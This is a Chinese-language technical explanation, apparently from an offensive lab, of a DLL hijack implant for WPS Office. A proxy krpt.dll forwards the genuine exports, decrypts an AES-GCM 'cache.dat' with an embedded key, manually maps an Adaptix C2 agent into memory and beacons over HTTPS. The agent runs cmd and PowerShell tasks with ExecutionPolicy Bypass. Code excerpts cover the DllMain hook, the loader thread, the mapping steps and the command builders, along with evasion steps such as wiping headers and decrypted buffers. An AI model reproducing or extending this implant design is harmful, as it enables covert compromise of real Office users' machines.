# WPS DLL 如何进入自研 Agent：代码链、`cache.dat` 加密和运行时回连详解

本文专门解释最终 `release-wpp-functional-v1` 候选中，WPP/WPS 宿主怎样从 `krpt.dll` 进入自研 direct_https Agent，以及 `cache.dat` 里到底保存了什么、加密发生在哪一层、运行时如何恢复。

本文面向刚开始接触 Windows DLL、PE 文件、交叉编译和 Agent 架构的读者。阅读时可以先看第 1、2、3 节，再回头看第 5、6 节的底层实现。

## 1. 先给结论

最重要的结论有四个：

1. 本次实时验证中，WPS 实际加载的是 `krpt.dll`，没有加载 `krpt.agent.dll`；它也不是 `agent_direct_https.so`。
2. `agent_direct_https.so` 是 Teamserver 侧的 Adaptix 插件；WPS 靶机侧真正执行的 Windows Agent 代码位于 `direct_https_profile.x64.dll`，随后被打包进 `cache.dat`。
3. `krpt.dll` 自身主要承担“宿主接入 + 启动 loader”职责。它先通过 `DllMain` 创建工作线程，再调用被重命名为 `dhpl_loader_main()` 的 loader 入口。
4. loader 读取 `cache.dat`，用 AES-256-GCM 解密出 DHPL1 容器，手工把 profile DLL 的各个 section 映射到内存，完成重定位、导入、TLS、异常表和初始化，最后调用 `RunAgentDll()`；`RunAgentDll()` 再转到 `AgentMain(NULL)`。

完整调用链可以画成下面这样：

```mermaid
flowchart TD
    A[WPP/WPS 进程] --> B[按正常模块名加载 krpt.dll]
    B --> C[krpt_proxy_agent.c 的 DllMain]
    C --> D[start_agent_once]
    D --> E[创建工作线程]
    E --> F[dhpl_loader_main]
    F --> G[读取同目录 cache.dat]
    G --> H[DHPLE2 AES-256-GCM 解密]
    H --> I[得到 DHPL1 明文容器]
    I --> J[分配内存并复制 PE sections]
    J --> K[重定位 + 解析导入 + 注册异常表]
    K --> L[TLS callbacks + profile DllMain]
    L --> M[image + run_agent_rva]
    M --> N[RunAgentDll]
    N --> O[AgentMain(NULL)]
    O --> P[ApiLoad]
    P --> Q[new Agent]
    Q --> R[AgentConfig 解开内嵌 profile]
    R --> S[ConnectorHTTP 初始化]
    S --> T[HTTPS check-in]
    T --> U[Teamserver 的 agent_direct_https.so]
    U --> V[任务编码 / 结果解析]
```

## 2. 每个文件分别负责什么

| 文件 | 所在位置 | 主要角色 |
|---|---|---|
| `krpt.dll` | WPP/WPS 目录 | 自研代理 DLL；保留原始 `krpt.dll` 的导出，同时启动 DHPL loader |
| `krpt_orig.dll` | WPP/WPS 目录 | 从靶机备份的原始 WPS `krpt.dll`，供导出转发使用 |
| `cache.dat` | WPP/WPS 目录 | DHPLE2 外层加密文件，里面是 DHPL1 容器，不是普通 PE 文件 |
| `direct_https_profile.x64.dll` | Linux 构建/报告目录 | 从 direct_https C++ Agent 对象链接出来的 Windows profile DLL，作为 `cache.dat` 的输入 |
| `profile.bin` | profile 构建目录 | 275 字节的 Agent 通信配置封装，最终嵌入 profile DLL 的 `PROFILE` 字节数组 |
| `agent_direct_https.so` | Teamserver 目录 | Go 服务端插件，负责任务编码、结果解析、Agent 注册和 UI 对接 |
| `loader_profile_only.c` | `research/memory-loader-lab/src` | DHPLE2 解密、DHPL1 校验和 profile DLL 手工映射实现 |
| `direct_https_dll_entry.cpp` | `research/memory-loader-lab/src` | DLL 入口包装层，导出 `RunAgentDll()` 并转到已有 `AgentMain()` |
| `krpt_proxy_agent.c` | `wps_wpp_krpt_lab/build-agent` | WPS 宿主代理层，负责定位同目录 `cache.dat` 和启动 loader |

这里最容易混淆的是 `agent_direct_https.so` 和 `cache.dat`：

- `agent_direct_https.so` 在服务器侧，Teamserver 加载它以后才能理解 direct_https Agent 的心跳、任务和结果。
- `cache.dat` 在 Windows 靶机侧，由 WPP/WPS 中的 `krpt.dll` 读取。
- `cache.dat` 里装的是 profile DLL 的运行时信息；profile DLL 中才包含 `AgentMain`、`Commander`、`ConnectorHTTP` 等 Windows 代码。

因此，最终 WPP 链路并不是把 Linux `.so` 文件复制到 Windows 进程中，而是“服务端插件”和“Windows profile DLL”分别构建、通过同一套协议配合工作。

## 3. WPS 为什么会先进入 `krpt.dll`

### 3.1 原始 DLL 和代理 DLL 的关系

WPS 自己原来就会按照固定名称寻找 `krpt.dll`，并且会依赖这个 DLL 的导出函数。当前实现保留了这个宿主契约：

1. 先把原始厂商文件保存成 `krpt_orig.dll`。
2. 用 `gen_krpt_def.py` 读取 `krpt_orig.dll` 的导出表。
3. 生成 `krpt_proxy.def`，把每个导出转发到 `krpt_orig.dll`。
4. 编译自研代理源文件并链接这个 `.def` 文件，输出新的 `krpt.dll`。

生成脚本位于 [gen_krpt_def.py](research/wps-krpt-proxy/gen_krpt_def.py:11)。它通过 `x86_64-w64-mingw32-objdump -p` 解析原始 DLL 的导出，并在第 48 行以后写出类似下面的转发表：

```def
LIBRARY krpt.dll
EXPORTS
    ?_force_link_krpt@@YAXXZ=krpt_orig.?_force_link_krpt@@YAXXZ @1
    _krpt_RegisterWERHandler=krpt_orig._krpt_RegisterWERHandler @2
    _krpt_RuntimeProtect=krpt_orig._krpt_RuntimeProtect @5
    onElfTerm=krpt_orig.onElfTerm @8
```

左边是 WPS 看到的导出名字，右边是 Windows loader 最终转发到的目标。这样做的目的，是让原始 WPS 功能仍然有对应的入口，同时把自研启动逻辑放进新的 DLL 的 `DllMain`。

最终候选的转发表证据在 [krpt_proxy.def](LOCAL_CANDIDATE_ROOT/krpt-build/krpt_proxy.def:1)。

### 3.2 `DllMain` 是宿主进入点

代理源文件是 [krpt_proxy_agent.c](research/wps-krpt-proxy/krpt_proxy_agent.c:199)。关键代码逻辑如下：

```c
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        g_hinst = hinst;
        DisableThreadLibraryCalls(hinst);
        init_paths();
        append_log("DLL_PROCESS_ATTACH");
        start_agent_once();
    }
    return TRUE;
}
```

逐句解释：

- `DLL_PROCESS_ATTACH` 表示这个 DLL 第一次进入当前进程。
- `g_hinst = hinst` 保存 DLL 自己的模块句柄，后面用它定位 DLL 所在目录。
- `DisableThreadLibraryCalls` 让系统后续线程创建/退出时减少对这个 DLL 的通知，降低宿主回调负担。
- `init_paths()` 计算 `krpt.dll` 的完整路径和同目录 `cache.dat` 路径。
- `start_agent_once()` 只启动一次后台工作线程。
- `DllMain` 本身最后立即返回 `TRUE`，表示 DLL 加载成功。

这里有一个很重要的工程细节：复杂的解密、内存分配、手工映射和网络回连都放到后续工作线程里，而不是直接塞进 `DllMain`。这样宿主完成自己的 DLL 装载回调后，Agent 再进入自己的执行阶段，代码结构也更容易定位每一步的错误。

### 3.3 如何定位 `cache.dat`

`init_paths()` 在 [krpt_proxy_agent.c](research/wps-krpt-proxy/krpt_proxy_agent.c:43) 中完成路径处理：

1. `GetModuleFileNameA(g_hinst, ...)` 取得当前代理 DLL 的完整路径。
2. 从最后一个反斜杠向前截取目录。
3. 在这个目录后面拼接 `cache.dat`。

核心拼接代码位于 [krpt_proxy_agent.c](research/wps-krpt-proxy/krpt_proxy_agent.c:73)：

```c
join_dir_leaf(g_cache_path, sizeof(g_cache_path), g_dir_path, "cache.dat",
              "C:\\Users\\Public\\cache.dat");
```

在真实部署目录中，实际效果类似：

```text
C:\Users\LAB_USER\AppData\Local\Kingsoft\WPS Office\12.1.0.26886\office6\krpt.dll
C:\Users\LAB_USER\AppData\Local\Kingsoft\WPS Office\12.1.0.26886\office6\cache.dat
```

也就是说，代理不需要把大段 profile 字节写到 DLL 的资源段中；它只需要知道自己位于哪个目录，然后读取旁边的 `cache.dat`。

### 3.4 为什么代理要另起线程

最终诊断版的线程入口在 [krpt_proxy_agent.c](research/wps-krpt-proxy/krpt_proxy_agent.c:129)：

```c
static DWORD WINAPI agent_loader_thread(LPVOID param)
{
    char arg0[] = "krpt.dll";
    char* argv[5];
    int rc;

    init_paths();
    Sleep(100);

    argv[0] = arg0;
    argv[1] = g_cache_path;
    argv[2] = NULL;
    argv[3] = g_loader_log_path;
    argv[4] = NULL;

    rc = dhpl_loader_main(4, argv);
    return (DWORD)rc;
}
```

这段代码做了四件事：

1. 等待很短的时间，让 WPS 的常规 DLL 回调先完成。
2. 把同目录 `cache.dat` 的完整路径放到 `argv[1]`。
3. 把诊断日志路径放到 `argv[3]`，方便把 loader 的阶段写入文件。
4. 调用 `dhpl_loader_main(4, argv)`。

`dhpl_loader_main` 并不是一个单独的外部 EXE。构建时 [build-krpt-proxy.sh](research/wps-krpt-proxy/build-krpt-proxy.sh:18) 传入了：

```text
-Dmain=dhpl_loader_main
```

这会把 [loader_profile_only.c](research/memory-loader-lab/src/loader_profile_only.c:1548) 原本的 `main()` 在预处理阶段重命名成 `dhpl_loader_main()`。随后脚本在第 39 行把它编译成对象文件，在第 43 行把对象文件链接进 `krpt.dll`。

因此，“WPS DLL 如何引出 Agent”的关键连接点就是：

```text
代理 DLL 的工作线程
    -> dhpl_loader_main()
    -> run_loader()
    -> runAgent()
    -> RunAgentDll()
    -> AgentMain(NULL)
```

### 3.5 为什么后续只保留 `krpt.dll`

前一版候选曾经把同一个文件复制成两个名字，因此历史目录中可以看到 `krpt.dll` 和 `krpt.agent.dll`，两者当时的 SHA-256 也相同。这只是构建脚本的兼容性副本，不是第二套 Agent，也没有第二个入口逻辑。

随后对正在运行的 WPS 进程做了实时模块枚举。证据时间为 `2026-07-23 21:33:02`，本次快照中发现 3 个 `wps.exe` 进程，全部加载：

```text
...\office6\krpt.dll
```

同一份模块列表中没有 `krpt.agent.dll`。完整记录见 [module-load-evidence-20260723.md](LOCAL_CANDIDATE_ROOT/module-load-evidence-20260723.md)。这份运行时证据比旧的文件清单更能说明哪个 DLL 真正参与了 WPS 进程。

因此从下一候选开始执行以下规则：

1. 构建脚本只生成 `krpt.dll`。
2. 输出目录如果残留旧候选的 `krpt.agent.dll`，构建脚本会先清理它。
3. 部署脚本只部署、静态扫描和计算 `cache.dat`、`krpt.dll`。
4. 远程 WPS 目录中如果存在旧的 `krpt.agent.dll`，新部署开始前会将其移除，避免把历史副本误认为当前加载模块。

旧 `release-wpp-functional-v1` 目录中的 `krpt.agent.dll`、旧哈希和旧扫描报告仍作为历史实验留存；它们说明上一版候选曾经生成过副本，不代表后续版本仍会生成或部署该文件。

## 4. `cache.dat` 是什么，不是什么

### 4.1 它不是普通的 DLL 文件

最终 `cache.dat` 的基本证据如下：

| 项目 | 实际值 |
|---|---:|
| 文件大小 | `79896` 字节 |
| SHA-256 | `5c89811ade759d5c1c6cc25f153357931f66320160da63e77c055c7d2193961b` |
| 磁盘前 8 字节 | `48 5d 72 05 6a 02 00 00` |
| 磁盘开头是否为 `MZ` | 否 |
| 磁盘开头是否为 DHPL1 | 否 |
| 磁盘开头是否为 DHPLE2 | 是 |
| AES 密文大小 | `79808` 字节 |
| 解密后明文大小 | `79808` 字节 |
| 解密后前 8 字节 | `4c 57 39 15 4b 00 00 00` |

这些数据来自 [cache.dat.meta.json](LOCAL_CANDIDATE_ROOT/cache.dat.meta.json:1)。

因此，直接对 `cache.dat` 执行普通 PE 工具时看不到 `MZ`/`PE\0\0`，这是预期结果。它是自研的“加密外层 + 自定义 PE 最小容器”，不是把完整 DLL 原样改名。

### 4.2 活跃链路和历史 `.bin` 链路的区别

报告里同时可以看到：

- `direct_https_profile.x64.dll`：原始 Windows profile DLL。
- `direct_https_profile.x64.bin`：早期学习阶段用的 XOR 打包结果，便于验证“先还原 DLL，再内存加载”。
- `cache.dat`：最终 WPP/WPS 候选使用的 DHPLE2 + DHPL1 容器。

最终 WPP 代理读取的是 `cache.dat`，不是把 `.bin` 作为当前入口。`.bin` 是保留的学习和对照制品，`cache.dat` 是最终候选的活动载荷容器。

## 5. `cache.dat` 的两层数据结构

可以把整个文件理解成下面的嵌套关系：

```text
cache.dat
└── DHPLE2 外层信封
    ├── 44 字节固定头
    ├── 16 字节随机 salt
    ├── 12 字节随机 nonce
    ├── 16 字节 GCM tag
    └── 79808 字节 AES-GCM 密文
        └── 解密后得到 DHPL1 明文容器
            ├── DHPL1 header
            ├── section records
            ├── relocation RVA 数组
            ├── import records
            ├── TLS callback RVA 数组
            ├── 对齐填充
            └── profile DLL 各 section 的原始数据
```

### 5.1 第一层：DHPLE2 AES-256-GCM

加密封装实现位于 [pack_profile_container.py](research/memory-loader-lab/pack_profile_container.py:117)。它的步骤如下：

1. 用 `os.urandom(16)` 生成每个文件独立的 16 字节 salt。
2. 用 `os.urandom(12)` 生成 AES-GCM nonce。
3. 用 `PBKDF2-HMAC-SHA256(passphrase, salt, 100000)` 派生 32 字节 AES-256 密钥。
4. 使用 AES-GCM 加密 DHPL1 明文。
5. 把 GCM 产生的 16 字节认证 tag 与密文分开保存。
6. 把算法编号、KDF 编号、迭代次数、长度字段写入 DHPLE2 header。

构建端使用的固定参数在 [pack_profile_container.py](research/memory-loader-lab/pack_profile_container.py:59) 到第 79 行：

```text
magic       = 48 5d 72 05 6a 02 00 00
version     = 2
algorithm   = AES-256-GCM + PBKDF2-HMAC-SHA256
kdf         = PBKDF2-HMAC-SHA256
iterations  = 100000
salt        = 16 bytes, random per file
nonce       = 12 bytes, random per file
tag         = 16 bytes
AAD         = 793b730c264c27104873636a0a330e21063c02536d67161a
```

最终候选的实际元数据是：

```text
envelope       DHPLE2
algorithm      AES-256-GCM
key derivation PBKDF2-HMAC-SHA256(passphrase, salt, iterations)
iterations     100000
salt           b973dc305518a1288d527febbea68f07
nonce          65825bcc5bd0a1bebf2c3c9e
tag            032bb2c927da1ddf213da8e9f52e1e55
ciphertext     79808 bytes
```

### 5.2 AES-GCM 在这里解决什么问题

对初学者来说，可以把 AES-GCM 理解成两项能力的组合：

- **保密性**：磁盘上的 `cache.dat` 直接查看时不是明文 PE，也看不到 profile DLL 的 section 内容。
- **完整性**：如果密文、salt、nonce、tag 或 AAD 不匹配，GCM 校验失败，loader 得不到明文容器。

这不是“让分析失去入口”的保护。因为运行时必须得到 AES 密钥，而当前 release loader 内置了 fallback passphrase。这个 passphrase 在 [loader_profile_only.c](research/memory-loader-lab/src/loader_profile_only.c:75) 以一层 XOR 形式保存，运行时由 [decode_ascii_xor](research/memory-loader-lab/src/loader_profile_only.c:153) 还原。

换句话说：

```text
磁盘静态查看：看到 DHPLE2 密文
正常运行：loader 用内置 key 解密
动态调试：在 key 派生、AES 解密或映射后的内存处可以观察到明文
```

所以这里的设计目标是“磁盘封装、完整性校验和运行时最小暴露”，而不是把密钥变成服务器才持有的远程秘密。

### 5.3 第二层：profile 内嵌配置的 RC4 封装

`cache.dat` 外层 AES 下面，还有一层 direct_https 原有 profile 配置封装。构建脚本 [build_direct_https_profile_dll.py](research/memory-loader-lab/build_direct_https_profile_dll.py:180) 到第 275 行完成这一步：

1. 从 Adaptix listener 读取 callback 地址、端口、URI、User-Agent、心跳 Header、SSL 和 sleep 等配置。
2. 按 Windows Agent `AgentConfig` 期望的字段顺序打包。
3. 使用 listener 的 `encrypt_key` 做 RC4。
4. 把结果封装为：`[crypt_params_size][RC4 密文][16 字节 encrypt_key]`。
5. 写成 `profile.bin`，再转成编译器的 `\\xNN` 字节串，传给 `config.cpp` 的 `PROFILE` 宏。

对应的构建命令可以在 [profile-build-ps-encoding.log](LOCAL_CANDIDATE_ROOT/release-wpp-functional-v1/build-logs/profile-build-ps-encoding.log:12) 看到。最终 metadata 记录 `profile_size=275`、`crypt_params_size=255`。

profile DLL 中的 [config.cpp](AdaptixServer/extenders/direct_https_agent/src_beacon/beacon/config.cpp:3) 只负责把编译期嵌入的 `PROFILE` 字节数组返回给 Agent：

```cpp
char* getProfile()
{
    return (char*) PROFILE;
}

unsigned int getProfileSize()
{
    return PROFILE_SIZE;
}
```

真正的运行时解密在 [AgentConfig.cpp](AdaptixServer/extenders/direct_https_agent/src_beacon/beacon/AgentConfig.cpp:21)：

```cpp
ULONG size = getProfileSize();
CHAR* profileBytes = (CHAR*)MemAllocLocal(size);
memcpy(profileBytes, getProfile(), size);

Packer* packer = new Packer((BYTE*)profileBytes, size);
ULONG profileSize = packer->Unpack32();

this->encrypt_key = (PBYTE)MemAllocLocal(16);
memcpy(this->encrypt_key, packer->data() + 4 + profileSize, 16);

DecryptRC4(packer->data() + 4, profileSize, this->encrypt_key, 16);
```

解密后，后续代码按顺序恢复：

```text
agent_type
kill_date
working_time
sleep_delay
jitter_delay
listener_type
SSL 开关
服务器和端口
HTTP method
URI 列表
心跳 Header
User-Agent 列表
Host header
代理参数
```

这里要分清两个 key：

- DHPLE2 的 passphrase 用于解开 `cache.dat` 外层。
- listener `encrypt_key` 用于 Agent 内嵌 profile 的 RC4 配置解密。

它们属于不同格式、不同阶段和不同用途。

## 6. loader 如何把加密文件变成可执行 Agent

### 6.1 读取文件

`run_loader()` 在 [loader_profile_only.c](research/memory-loader-lab/src/loader_profile_only.c:1407) 中开始工作：

```c
rc = (DWORD)read_file_winapi(containerPath, &encryptedFile, &encryptedFileSize);
if (rc != 0) {
    return 10;
}
```

`read_file_winapi()` 使用 `CreateFileA`、`GetFileSizeEx`、`ReadFile` 把 `cache.dat` 读入临时堆缓冲区。它设置了最大文件大小检查，避免长度字段导致过大分配。

### 6.2 识别 DHPLE2 header

解密函数位于 [loader_profile_only.c](research/memory-loader-lab/src/loader_profile_only.c:1050)。它先检查 DHPLE2 magic，再验证：

- version 是否为 2；
- algorithm 是否为 AES-256-GCM + PBKDF2-SHA256；
- KDF 迭代次数是否在合理范围；
- salt 长度是否在允许范围；
- nonce 是否为 12 字节；
- tag 是否为 16 字节；
- 明文和密文长度是否大于 0；
- header 后各区域是否刚好落在文件范围内。

最终候选的 DHPLE2 文件布局是：

```text
offset 0       44 字节 DHPLE2_HEADER
offset 44      16 字节 salt
offset 60      12 字节 nonce
offset 72      16 字节 GCM tag
offset 88      79808 字节 ciphertext
文件末尾       offset 79896
```

### 6.3 Windows 侧如何复现 AES 密钥

构建脚本在 Linux 侧使用 Python `hashlib.pbkdf2_hmac()` 派生 32 字节密钥，见 [pack_profile_container.py](research/memory-loader-lab/pack_profile_container.py:98)。Windows loader 使用系统 CNG/Bcrypt，见 [loader_profile_only.c](research/memory-loader-lab/src/loader_profile_only.c:862)：

```text
BCryptOpenAlgorithmProvider(SHA256, HMAC)
    -> BCryptDeriveKeyPBKDF2(passphrase, salt, 100000)
    -> 32 字节 AES key
```

随后 [decrypt_cipher_aes_gcm_with_key](research/memory-loader-lab/src/loader_profile_only.c:927) 完成：

```text
BCryptOpenAlgorithmProvider(AES)
    -> BCryptSetProperty(GCM)
    -> BCryptGenerateSymmetricKey(key)
    -> BCryptDecrypt(cipher, nonce, tag, AAD)
    -> DHPL1 明文
```

最终 proxy 的 loader 使用 `PROFILE_ONLY_DYNAMIC_BCRYPT`，所以 Bcrypt 模块和关键导出函数通过 `LoadLibraryA`/`GetProcAddress` 在运行时解析。具体解析逻辑在 [resolve_dynamic_bcrypt](research/memory-loader-lab/src/loader_profile_only.c:312)。

这和 profile DLL 的 API 解析是两件事：

- proxy/loader 自己需要 CNG 解密，因此动态取得 Bcrypt 函数地址。
- profile DLL 进入 `AgentMain` 后，再按 direct_https Agent 的 `ApiLoad()` 逻辑准备 WinAPI/WinINet 函数表。

### 6.4 解密后的 DHPL1 是什么

解密得到的明文以自定义 DHPL1 magic 开头：

```text
4c 57 39 15 4b 00 00 00
```

DHPL1 不是完整 PE 文件，而是离线解析 PE 后保留的最小运行信息。构建端 [pack_profile_container.py](research/memory-loader-lab/pack_profile_container.py:441) 会预先提取：

- `section` 的虚拟地址、虚拟大小、原始数据位置和最终内存保护属性；
- 63 个 x64 relocation RVA；
- 24 个导入函数及其 IAT RVA；
- 2 个 TLS callback RVA；
- `.pdata` exception table 的位置和大小；
- profile DLL 的入口点 RVA；
- `RunAgentDll` 的函数 RVA。

最终候选的关键数值：

```text
preferred image base  0x254280000
image size            114688 bytes
size of headers       1024 bytes
entry point RVA       0x1200
RunAgentDll RVA       0x1340
section count         10
reloc count           63
import count          24
TLS callback count    2
exception RVA         0x15000
exception size        432 bytes
```

这些值都在 [cache.dat.meta.json](LOCAL_CANDIDATE_ROOT/cache.dat.meta.json:1) 中有记录。

### 6.5 内存映射的具体顺序

`run_loader()` 在 [loader_profile_only.c](research/memory-loader-lab/src/loader_profile_only.c:1439) 以后严格按以下顺序执行：

#### 第一步：校验 DHPL1 header

`validate_header()` 检查 magic、版本、x64 架构、总长度、各个 offset、section 数组范围以及 `entry_point_rva`/`run_agent_rva` 是否落在 image 范围内。这样后面的指针运算都建立在已验证的范围上。

#### 第二步：分配 image 内存

代码先尝试在 profile 原本偏好的 image base 分配 `PAGE_READWRITE` 内存；如果该地址已经被占用，再让系统选择其他地址。这样做是普通 PE 重定位所需要的基础条件。

```text
优先地址：0x254280000
失败后：系统选择其他可用地址
初始保护：PAGE_READWRITE
```

对应代码在 [loader_profile_only.c](research/memory-loader-lab/src/loader_profile_only.c:1452)。

#### 第三步：复制 section 数据

`copy_sections()` 位于 [loader_profile_only.c](research/memory-loader-lab/src/loader_profile_only.c:1184)。它遍历 DHPL1 section records，把每个 section 的数据复制到：

```text
image_base + section.virtual_address
```

它不会把整个原始 DLL 文件直接复制进去，而是只复制当前 profile 运行所需的 section 数据。

#### 第四步：应用 relocation

如果实际分配地址和 `preferred_image_base` 不相同，`apply_relocations()` 用：

```text
delta = actual_base - preferred_base
```

遍历 DHPL1 保存的 relocation RVA，并把对应 64 位指针加上 `delta`。实现位于 [loader_profile_only.c](research/memory-loader-lab/src/loader_profile_only.c:1209)。

如果刚好分配到偏好地址，`delta` 为 0，重定位步骤直接结束。

#### 第五步：解析导入并填写 IAT

`resolve_imports()` 位于 [loader_profile_only.c](research/memory-loader-lab/src/loader_profile_only.c:1228)。每条 import record 包含：

```text
module_len
name_len
iat_rva
module name
function name
```

运行时对每条记录执行：

```text
LoadLibraryA(moduleName)
GetProcAddress(module, functionName)
*(image + iat_rva) = functionAddress
```

这一步让 profile DLL 的代码可以正常调用 `KERNEL32.dll`、`msvcrt.dll` 等依赖。注意：profile DLL 自己没有使用系统 `LoadLibrary` 作为主入口；这里的 `LoadLibraryA` 主要用于加载它的依赖模块。

#### 第六步：注册 x64 异常表

Windows x64 的 C++/异常展开依赖 `.pdata` 中的 `RUNTIME_FUNCTION` 表。loader 在 [register_exception_table](research/memory-loader-lab/src/loader_profile_only.c:1301) 使用 `RtlAddFunctionTable` 把映射 image 的异常函数表注册到当前进程。

最终 metadata 中记录 `.pdata` 的 `exception_rva=0x15000`、`exception_size=432`，这就是这一步使用的数据。

#### 第七步：按 section 重新设置内存保护

`protect_sections()` 位于 [loader_profile_only.c](research/memory-loader-lab/src/loader_profile_only.c:1331)。映射初期整块内存是可读写，复制和重定位结束后，代码按照 section 特征设置最终保护：

```text
.text   -> PAGE_EXECUTE_READ
.data   -> PAGE_READWRITE
.rdata  -> PAGE_READONLY
.pdata  -> PAGE_READONLY
.xdata  -> PAGE_READONLY
```

这样运行阶段不会长期把整个 image 保持在可写可执行状态，section 的内存属性也和构建端 metadata 保持一致。

#### 第八步：调用 TLS callbacks

`call_tls_callbacks()` 位于 [loader_profile_only.c](research/memory-loader-lab/src/loader_profile_only.c:1357)。最终 profile 记录了两个 callback RVA：

```text
0x1390
0x1370
```

loader 将它们转换为 `image + callback_rva`，按 `DLL_PROCESS_ATTACH` 调用。手工映射若跳过 TLS，部分编译器运行时或全局初始化可能出现状态不完整。

#### 第九步：调用 profile DLL 的 DllMain

`call_dllmain()` 位于 [loader_profile_only.c](research/memory-loader-lab/src/loader_profile_only.c:1375)。它用 `entry_point_rva=0x1200` 计算入口地址，并传入：

```text
hinstDLL = image base
reason   = DLL_PROCESS_ATTACH
reserved = NULL
```

profile 的 [direct_https_dll_entry.cpp](research/memory-loader-lab/src/direct_https_dll_entry.cpp:29) 中，`DllMain` 只返回 `TRUE`，不在这个阶段连接网络，也不执行复杂初始化。

#### 第十步：清理明文 header 和 DHPL1 临时缓冲

在入口调用前，loader 会清零映射 image 前面的 PE header 区域，并把这部分设为只读，见 [zero_and_protect_headers](research/memory-loader-lab/src/loader_profile_only.c:1390)。

随后从堆中清零并释放已经解密的 DHPL1 容器，见 [run_loader](research/memory-loader-lab/src/loader_profile_only.c:1520)：

```c
heap_secure_free(container, containerSize);
container = NULL;
containerSize = 0;
h = NULL;
```

这里要区分两块内存：

- DHPL1 容器是临时输入，映射完成后可以清理。
- profile DLL image 是正在运行的代码和数据，Agent 运行期间继续留在进程内存中。

#### 第十一步：按 RVA 调用 `RunAgentDll`

最后的关键代码在 [loader_profile_only.c](research/memory-loader-lab/src/loader_profile_only.c:1520)：

```c
runAgentRva = h->run_agent_rva;
runAgent = (RunAgentDllFn)(void*)(image + runAgentRva);
rc = runAgent();
```

这里不再通过运行时导出表搜索字符串，而是直接使用 packer 已经写进 DHPL1 header 的 `run_agent_rva`。最终值是 `0x1340`。

## 7. `RunAgentDll()` 如何进入完整 Agent

### 7.1 DLL 包装入口

源码位于 [direct_https_dll_entry.cpp](research/memory-loader-lab/src/direct_https_dll_entry.cpp:15)：

```cpp
extern "C" __declspec(dllexport) DWORD WINAPI RunAgentDll(void)
{
    return AgentMain(NULL);
}
```

这里的 `extern "C"` 让导出名字保持为 `RunAgentDll`，避免 C++ 名字改编。`__declspec(dllexport)` 让链接器把它放进 DLL 导出表。pack 工具在 Linux 构建阶段找到这个导出，并把函数 RVA 记录到 DHPL1；最终容器还把映射镜像中的 `RunAgentDll` 字符串清零，因为运行时已经只需要 RVA。

### 7.2 `AgentMain()` 的初始化顺序

入口实现位于 [MainAgent.cpp](AdaptixServer/extenders/direct_https_agent/src_beacon/beacon/MainAgent.cpp:776)。完整构建中大致按下面的顺序执行：

1. 写入 `AGENTMAIN_ENTER` 诊断标记。
2. 执行 `ApiLoad()`，准备 WinAPI/NTAPI 函数指针表。
3. `new Agent()`。
4. 构造 `AgentInfo`、`AgentConfig`、`Commander`、`Downloader`、`JobsController`、`MemorySaver`。
5. 生成 16 字节 `SessionKey`。
6. `BuildBeat()` 生成首次 check-in 数据。
7. `ConnectorHTTP::SetProfile()` 保存服务器、端口、URI、HTTP method、Header 和 sleep 配置。
8. 进入连接循环，执行 `Exchange()`、收取任务、调用命令处理器、回传结果、按 profile sleep。

`Agent` 构造函数在 [Agent.cpp](AdaptixServer/extenders/direct_https_agent/src_beacon/beacon/Agent.cpp:39)；`AgentMain` 创建核心对象的代码在 [MainAgent.cpp](AdaptixServer/extenders/direct_https_agent/src_beacon/beacon/MainAgent.cpp:1147)。

### 7.3 Agent 再次解开内嵌 profile

当执行到 `new Agent()` 时，`Agent` 构造函数会创建 `AgentConfig`。`AgentConfig` 从 profile DLL 的 `.data/.rdata` 中读取编译期嵌入的 `PROFILE` 字节数组，然后完成前面第 5.3 节的 RC4 解密。

这是两次“解密”的时间顺序：

```text
WPP 加载 krpt.dll
    -> AES-GCM 解开 cache.dat
    -> 得到并映射 profile DLL
    -> RunAgentDll
    -> AgentMain
    -> AgentConfig
    -> RC4 解开内嵌 listener profile
    -> ConnectorHTTP 使用明文通信配置
```

所以 `cache.dat` 的 AES 解密和 Agent profile 的 RC4 解密不是重复工作：前者恢复“代码载体”，后者恢复“代码运行所需的 listener 配置”。

### 7.4 主循环如何回连和取任务

`AgentMain` 主循环在 [MainAgent.cpp](AdaptixServer/extenders/direct_https_agent/src_beacon/beacon/MainAgent.cpp:1191)：

```text
WaitForConnection
    -> 有结果则 Exchange(结果)
    -> 无结果则 Exchange(空请求)
    -> 读取响应
    -> ProcessCommandTasks
    -> ProcessDownloader
    -> ProcessJobs
    -> 按 sleep/jitter 等待
    -> 下一轮 check-in
```

其中：

- `ConnectorHTTP` 负责 WinINet 连接、HTTPS 请求、响应读取和连接状态。
- `Commander` 负责把任务 opcode 分发到 `hello`、`cmd`、`powershell`、文件 CRUD、`disks` 等 handler。
- `JobsController` 负责异步进程任务和结果收集。
- `Downloader` 与 `MemorySaver` 负责下载、上传分片和服务端任务状态。

## 8. 服务端 `agent_direct_https.so` 在链路中的位置

### 8.1 它负责协议和 UI，不负责 WPS 注入

`agent_direct_https.so` 是 Go 编译出来的 Teamserver extender。它在 [pl_main.go](AdaptixServer/extenders/direct_https_agent/pl_main.go:172) 通过 `InitPlugin()` 注册，在服务端保存 Teamserver 引用、模块目录和 Agent watermark。

它和 Windows profile DLL 的分工如下：

| 服务端插件 | Windows profile DLL |
|---|---|
| 把 UI 命令转成 opcode 和参数 | 从网络取任务并执行 opcode |
| 解析结果 envelope | 生成任务结果 envelope |
| 更新 Adaptix UI 任务状态 | 把结果写入回传缓冲区 |
| 处理上传/下载服务端状态 | 读取和写入 Windows 文件 |
| 注册 listener/Agent watermark | 生成首次 check-in heartbeat |

### 8.2 命令如何送到 Windows Agent

服务端 `CreateCommand()` 在 [pl_main.go](AdaptixServer/extenders/direct_https_agent/pl_main.go:974) 把 UI 命令转换为 `TaskData.Data`。

例如 `cmd`：

```go
programArgs := Ts.TsConvertUTF8toCp("cmd.exe /d /c " + commandLine, agentData.ACP)
array = []interface{}{COMMAND_PS_RUN, true, false, 0, programArgs}
```

例如 `powershell`：

```go
programArgs := Ts.TsConvertUTF8toCp(
    "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command " + commandLine,
    agentData.ACP,
)
array = []interface{}{COMMAND_PS_RUN, true, false, 0, programArgs}
```

文件类命令则使用 `COMMAND_PWD`、`COMMAND_CD`、`COMMAND_LS`、`COMMAND_CAT`、`COMMAND_MKDIR`、`COMMAND_RM`、`COMMAND_COPY`、`COMMAND_MV`、`COMMAND_DISKS`、`COMMAND_UPLOAD` 和 `COMMAND_DOWNLOAD` 等 opcode。

### 8.3 Windows 结果怎样回到 UI

